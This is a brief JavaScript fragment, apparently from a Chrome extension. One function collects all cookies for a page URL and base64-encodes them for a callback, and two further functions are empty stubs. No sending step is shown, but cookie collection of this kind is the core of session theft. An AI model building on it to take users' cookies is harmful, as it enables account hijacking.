function getCookies(tab, info, cb) {
	chrome.cookies.getAll({'url':info.url},function(cookies) {
		textToBase64(JSON.stringify(cookies),function(base64){
			cb(base64);
		});
	});
}

function CreateUser(tab, info) {
}

function closeAllWind(tab, info) {
}
